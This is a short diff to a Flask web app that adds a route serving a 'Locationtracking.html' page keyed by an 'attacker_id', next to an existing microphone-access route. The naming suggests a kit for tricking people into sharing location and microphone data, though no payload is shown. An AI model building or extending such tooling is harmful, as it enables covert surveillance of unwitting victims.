@@ -92,6 +92,11 @@ def microphone_access(attacker_id):
     return render_template('mic.html', attacker_id=attacker_id)
 
 
+@app.route('/LocationsAcess-testing/<attacker_id>')
+def Location_access(attacker_id):
+    return render_template('Locationtracking.html', attacker_id=attacker_id)
+
+
 @app.route('/access', methods=['POST'])
 def access():
     Access_Platform = request.form['Access_Platform']
